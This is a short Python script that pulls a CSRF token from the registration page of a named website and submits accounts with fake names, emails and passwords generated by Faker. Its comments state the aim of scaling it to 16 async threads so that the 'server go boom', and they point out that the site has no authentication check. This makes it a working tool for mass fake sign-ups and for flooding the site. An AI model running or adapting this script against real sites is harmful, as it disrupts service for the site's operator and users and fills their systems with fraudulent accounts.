import requests
from bs4 import BeautifulSoup
from faker import Faker

fake = Faker()

def main(): # make this async and while true on 16 threads and server go boom
    session = requests.Session()

    for i in range(2):
        response = session.get("https://furywheel.me/register")
        soup = BeautifulSoup(response.text, "html.parser")
        csrf_token = soup.find("input", {"name": "_token"})["value"]

        password = fake.password(length=10)
        payload = {
            "_token": csrf_token,
            "name": fake.name(),
            "email": fake.email(),
            "password": password,
            "password_confirmation": password
        }

        post_response = session.post("https://furywheel.me/register", data=payload)

        print(f"Request {i+1}: {post_response.status_code}") # 200 , 200 (as of 01/09/2025) no auth thats very bad

    session.close()

if __name__ == "__main__":
    main()





